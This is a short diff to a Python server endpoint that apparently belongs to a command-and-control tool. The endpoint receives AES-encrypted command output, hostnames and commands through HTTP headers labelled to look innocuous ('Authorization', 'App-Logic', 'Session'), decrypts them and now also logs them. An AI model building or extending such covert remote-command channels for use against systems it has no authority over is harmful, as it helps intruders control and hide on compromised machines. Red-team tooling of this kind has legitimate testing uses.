@@ -283,7 +283,14 @@ def command(hostname):
 def cr():
         try:
             encrypted_response = request.headers["Authorization"]
-            print("\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n")
+            encrypted_hostname = request.headers["App-Logic"]
+            encrypted_command  = request.headers["Session"]
+
+            results = decrypt_command(aes_encryption_key, encrypted_response).strip("\x00")
+            hostname = decrypt_command(aes_encryption_key, encrypted_hostname).strip("\x00")
+            command = decrypt_command(aes_encryption_key, encrypted_command).strip("\x00")
+            log_command(hostname, command, results)
+            print("\nCommand execution result is : \n" + results + "\n")
             return "Done"
         except:
             return ""
